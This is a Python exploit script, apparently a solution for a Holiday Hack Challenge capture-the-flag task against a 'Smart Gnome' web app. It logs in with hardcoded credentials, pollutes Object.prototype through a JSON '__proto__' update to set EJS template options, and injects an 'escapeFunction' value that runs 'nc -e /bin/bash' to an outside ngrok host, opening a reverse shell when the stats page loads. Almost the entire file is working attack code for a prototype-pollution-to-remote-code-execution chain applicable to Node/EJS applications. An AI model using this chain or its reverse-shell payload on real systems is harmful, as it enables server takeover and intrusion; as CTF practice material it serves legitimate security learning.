#!/usr/bin/env python3

import requests
import json
import html
import urllib.parse
from bs4 import BeautifulSoup
import sys

"""
This script exploits a prototype pollution vulnerability in the Smart Gnome's
web application to achieve remote code execution.

It performs the following steps:
1. Logs into the Smart Gnome web application using provided credentials.
2. Triggers a JSON parsing error to confirm the vulnerability.
3. Stages the attack by updating the __proto__ object with a new property.
4. Weaponizes the attack by setting the escapeFunction property to execute a reverse shell command.
5. Loads the stats page to trigger the reverse shell.
"""

#
# Login
#
# 1. Log into the target app using valid credentials
# 2. Store cookies in a session object
# 3. Ensure all future requests are authenticated
#
print("\n===========================================")
print("Step 0. Start Login Session")
print("===========================================\n")
# login_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/login?id=dfbd809f-8d6a-4500-87ba-c6e29b90f34c"
login_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/login?id=47e583fe-b334-4821-83da-da0f7727f31f"
creds = { "username": "bruce", "password": "oatmeal12" }
print(f"[*] URL: {login_url}")

s = requests.Session()
r = s.post(login_url, data=creds)
print(f"[*] Login Status: {r.status_code}")
if r.status_code != 200:
    print(f"[*] Login Response: {r.text}")
    print("[!] Login failed. Exiting.")
    sys.exit(1)

#
# Trigger JSON parse error
# 
# 1. Intentionally break JSON parsing
# 2. Extract error details from the server-side response
#
# This helps:
# 1. Confirm how input is handled (JSON.parse)
# 2. Reveal stack traces, template engine (EJS), or code paths
# 3. Help identify injection points that allow for prototype pollution
#
print("\n===========================================")
print("Step 1. Provoke Error message")
print("===========================================\n")
error_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message='"
payload_r = s.get(error_url)
print(f"[*] URL: {payload_r.url}")
print(f"[*] Status: {payload_r.status_code}")

soup = BeautifulSoup(payload_r.text, "html.parser")

if soup.pre:
    raw_text = soup.pre.get_text()
else:
    print("[!] No <pre> tag found. Dumping raw response:")
    print(payload_r.text)
    raw_text = payload_r.text

decoded_text = html.unescape(raw_text)
print(decoded_text)

#
# Staging
#
# Prepare the environment for code injection:
# 1. Pollute Object.prototype via __proto__
# 2. Set internal flags used by the templating engine:
# - debug: may expose more verbose behavior or error messages
# - client: forces EJS into client-side compilation mode
#
print("\n===========================================")
print("Step 2. Staging")
print("===========================================")

for subkey in ["debug", "client"]:
    print(f"\n== Staging {subkey}\n")

    payload = {
        "action": "update",
        "key": "__proto__",
        "subkey": subkey,
        "value": 1
    }

    payload_encoded = urllib.parse.quote_plus(json.dumps(payload))
    proto_url = f"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={payload_encoded}"
    payload_r = s.get(proto_url)
    print(f"[*] URL: {payload_r.url}")
    print(f"[*] Response: {payload_r.text}")

#
# Weaponization
#
# 1. Inject code via polluted property used by EJS (escapeFunction)
# 2. Inject string that will be later interpreted as executable code
# 3. Execute a system command via process.mainModule.require('child_process').exec(...)
#    that will become the RCE primitive
print("\n===========================================")
print("Step 3. Weaponizing")
print("===========================================\n")

payload = {
    "action": "update",
    "key": "__proto__",
    "subkey": "escapeFunction",
    "value": "JSON.stringify; process.mainModule.require('child_process').exec('nc -e /bin/bash 8.tcp.ngrok.io 10135;sleep 10000000')"
}

payload_encoded = urllib.parse.quote_plus(json.dumps(payload))
proto_url = f"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={payload_encoded}"
payload_r = s.get(proto_url)
print(f"[*] URL: {payload_r.url}")
print(f"[*] Response: {payload_r.text}")

#
# Trigger Execution
# 
# 1. Load the page that renders an EJS template: Smart Gnome Control Center - Smart Gnome Statistics panel
# 2. The template uses the polluted property (escapeFunction)
# 3. When the page loads, the injected code gets executed during rendering,
#    resulting in a reverse shell connection back to the attacker's machine.
#
print("\n===========================================")
print("Step 4. Load Stats page to Start Reverse Shell")
print("===========================================\n")

stats_panel_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"
stats_r = s.get(stats_panel_url)
print(f"[*] Stats Response: {stats_r.text}")
